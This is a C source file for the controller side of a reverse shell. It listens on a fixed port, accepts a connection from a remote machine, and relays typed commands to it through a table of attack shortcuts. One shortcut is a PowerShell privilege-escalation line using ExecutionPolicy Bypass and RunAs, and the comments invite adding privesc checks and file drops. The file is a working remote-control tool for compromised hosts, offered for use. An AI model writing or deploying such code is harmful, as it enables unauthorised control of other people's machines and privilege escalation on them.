// controller.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/socket.h>

#define PORT 17293
#define BUF 4096

/* Shortcuts: first = typed shortcut, second = full command sent to remote */
const char *shortcuts[][2] = {
    {"plh", "ping 127.0.0.1"},
    {"who", "whoami"},
    {"elevate", 
     "Start-Process powershell.exe -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -Command 'Start-Process PowerShell -ArgumentList ''-NoProfile -ExecutionPolicy Bypass -Command ''Get-Process'' -Verb RunAs'\" -Verb RunAs"}, /* this doesn't work yet, like fify fifty*/
    {"whereami", "pwd"},
    /* Add your useful, cool commands here (like auto privesc priv checks, drop a file etc...)*/
    {NULL, NULL}
};

const char *get_full_command(const char *in) {
    for (int i = 0; shortcuts[i][0] != NULL; ++i) {
        if (strcmp(in, shortcuts[i][0]) == 0) return shortcuts[i][1];
    }
    return in; /* no shortcut -> return original */
}

int main(void) {
    int server_fd = -1, client_fd = -1;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);

    /* Create socket */
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;     /* listen on all interfaces */
    addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); close(server_fd); exit(1);
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen"); close(server_fd); exit(1);
    }

    printf("Listening on port %d, waiting for reverse connection...\n", PORT);

    client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen);
    if (client_fd < 0) { perror("accept"); close(server_fd); exit(1); }

    char peer[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr.sin_addr, peer, sizeof(peer));
    printf("Connected from %s:%d\n", peer, ntohs(addr.sin_port));

    /* Interactive loop: handle stdin (to send) and socket (to receive) */
    fd_set readfds;
    int maxfd = (client_fd > STDIN_FILENO) ? client_fd : STDIN_FILENO;
    char sendbuf[BUF];
    char recvbuf[BUF];

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(STDIN_FILENO, &readfds);   /* keyboard input */
        FD_SET(client_fd, &readfds);      /* remote output */

        int r = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (r < 0) {
            if (errno == EINTR) continue;
            perror("select"); break;
        }

        /* If remote sent data, print it */
        if (FD_ISSET(client_fd, &readfds)) {
            ssize_t n = recv(client_fd, recvbuf, sizeof(recvbuf)-1, 0);
            if (n <= 0) {
                if (n == 0) fprintf(stderr, "Remote closed connection\n");
                else perror("recv");
                break;
            }
            recvbuf[n] = '\0';
            fwrite(recvbuf, 1, n, stdout); /* print exactly what remote sent */
            fflush(stdout);
        }

        /* If we typed something, send it to the remote (expand shortcuts) */
        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            if (fgets(sendbuf, sizeof(sendbuf), stdin) == NULL) {
                /* EOF on stdin -> exit */
                fprintf(stderr, "EOF on stdin, closing\n");
                break;
            }
            /* remove trailing newline */
            size_t len = strlen(sendbuf);
            if (len > 0 && sendbuf[len-1] == '\n') sendbuf[--len] = '\0';

            /* ignore empty lines */
            if (len == 0) continue;

            const char *to_send = get_full_command(sendbuf);

            /* Ensure newline at end so remote shell reads full line */
            char out[BUF];
            snprintf(out, sizeof(out), "%s\n", to_send);

            ssize_t s = send(client_fd, out, strlen(out), 0);
            if (s < 0) {
                perror("send");
                break;
            }
        }
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
